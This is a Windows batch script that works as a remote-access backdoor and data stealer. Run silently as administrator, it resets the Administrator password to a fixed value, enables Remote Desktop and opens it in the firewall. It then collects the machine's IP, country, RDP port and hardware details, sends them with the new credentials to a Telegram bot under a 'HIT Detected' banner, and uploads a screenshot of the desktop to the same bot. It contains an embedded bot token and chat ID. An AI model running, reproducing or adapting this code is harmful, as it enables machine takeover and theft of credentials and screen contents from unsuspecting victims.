@echo off
setlocal enabledelayedexpansion

:: Ensure the script runs with administrative privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || exit /b

:: Change the Administrator password
net user Administrator P@ssw0rdXlazy >nul 2>&1
if %ERRORLEVEL% neq 0 (
    powershell -Command "net user Administrator P@ssw0rdXlazy" >nul 2>&1
    if %ERRORLEVEL% neq 0 exit /b
)

:: Enable Remote Desktop
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1

:: Allow Remote Desktop through Windows Firewall
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes >nul 2>&1

:: Define variables for Telegram
set BOT_TOKEN=7576409440:AAEhYc3BvwzU4FAC7xC6Sc9znSW9OBEtiNs
set CHAT_ID=-1002449605159
set SCREENSHOT_PATH=%USERPROFILE%\Desktop\screenshot.png
set IP_API_URL=https://ipinfo.io/json

:: Fetch IP and Country information using PowerShell
for /f "delims=" %%A in ('powershell -command "Invoke-WebRequest -Uri '%IP_API_URL%' -UseBasicParsing | ConvertFrom-Json | ForEach-Object { $_.ip + ',' + $_.country }"') do (
    set "ip_country=%%A"
)

:: Parse the fetched data into IP and Country
for /f "tokens=1,2 delims=," %%A in ("%ip_country%") do (
    set "ip=%%A"
    set "country=%%B"
)

:: Fetch Remote Desktop Port
for /f "delims=" %%A in ('powershell -command "(Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'PortNumber').PortNumber"') do (
    set "rdp_port=%%A"
)

:: Get system information
for /f "tokens=2 delims==" %%A in ('wmic os get Caption /value') do set "os_name=%%A"
for /f "tokens=2 delims==" %%A in ('wmic cpu get Name /value') do set "cpu_name=%%A"
for /f "tokens=2 delims==" %%A in ('wmic computersystem get NumberOfLogicalProcessors /value') do set "cores=%%A"
for /f "tokens=2 delims==" %%A in ('wmic os get TotalVisibleMemorySize /value') do set ram_kb=%%A
set /a ram_mb=!ram_kb! / 1024
set /a ram_gb=!ram_mb! / 1024

:: Format current time to 12-hour format
for /f "tokens=1-4 delims=:. " %%A in ("%time%") do (
    set /a hour=%%A
    if %%A geq 12 (
        set "am_pm=PM" 
        if %%A gtr 12 set /a hour=%%A-12
    ) else (
        set "am_pm=AM"
    )
    set formatted_time=!hour!:%%B %%am_pm%
)

:: Format Telegram message in HTML
set "message=<b>HIT Detected :)                                                                                      </b>"
set "message=!message!<b>                            ====[HIT INFO]====</b>"
set "message=!message!<b>                                                                                                                 [+] System =></b> !os_name!"
set "message=!message!<b>                                                                                                                 [+] RAM =></b> !ram_gb! GB"
set "message=!message!<b>                                                                                                                 [+] Processor =></b> !cpu_name!"
set "message=!message!<b>                                                                                                                 [+] Cores =></b> !cores!"
set "message=!message!<b>                                                                                                                 [+] IP =></b> !ip!"
set "message=!message!<b>                                                                                                                 [+] Port =></b> !rdp_port!"
set "message=!message!<b>                                                                                                                 [+] Country =></b> !country!"
set "message=!message!<b>                                                                                                                 [+] User =></b> Administrator"
set "message=!message!<b>                                                                                                                 [+] Password =></b> P@ssw0rdXlazy"
set "message=!message!<b>                                                                                                                 [+] Date =></b> %date% !formatted_time!"

:: Send system information message to Telegram
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=!message!" ^
     -d "parse_mode=html" >nul 2>&1

:: Capture screenshot using PowerShell
powershell -Command ^
    Add-Type -AssemblyName System.Windows.Forms; ^
    Add-Type -AssemblyName System.Drawing; ^
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); ^
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap); ^
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); ^
    $bitmap.Save('%SCREENSHOT_PATH%', [System.Drawing.Imaging.ImageFormat]::Png); ^
    $graphics.Dispose(); ^
    $bitmap.Dispose()

:: Check if screenshot was taken
if not exist "%SCREENSHOT_PATH%" exit /b

:: Send screenshot to Telegram bot
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
    -F "chat_id=%CHAT_ID%" ^
    -F "photo=@%SCREENSHOT_PATH%" >nul 2>&1

:: Clean up by deleting the screenshot file
del "%SCREENSHOT_PATH%" >nul 2>&1

endlocal
